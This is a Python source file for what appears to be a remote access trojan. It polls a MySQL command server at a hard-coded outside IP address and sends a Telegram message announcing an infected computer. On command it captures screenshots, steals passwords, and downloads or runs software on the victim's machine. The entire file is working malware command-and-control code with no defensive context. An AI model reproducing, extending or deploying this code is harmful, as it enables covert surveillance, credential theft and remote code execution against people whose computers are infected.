from sqlalchemy import create_engine, Column, Integer, String, Boolean, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import Session
import time
from modules import getPassword, downloadSoft, getScreen
from vars import bot_token, chat_id, bot, telebot

engine = create_engine('mysql+mysqlconnector://ratUser:ratUser@178.62.239.6/ratCommands')
Base = declarative_base()

class Commands(Base):
    __tablename__ = 'commands'
    id = Column(Integer, primary_key=True, autoincrement=True)
    command = Column(Text)
    status = Column(Boolean, default=False)
    commandText = Column(Text)

bot.send_message(chat_id, 'Есть зараженный комп')


while True:
    with Session(engine) as session:
        news_to_send = session.query(Commands).filter(Commands.status == False).all()
        for i in news_to_send:
          if i.command == '/screen':
            getScreen()
            i.status = True
            session.commit()
          if i.command == '/password':
            getPassword()
            i.status = True
            session.commit()
          if i.command == '/cmd':
            command = i.commandText
            downloadSoft(command)
            i.status = True
            session.commit()


    time.sleep(2)
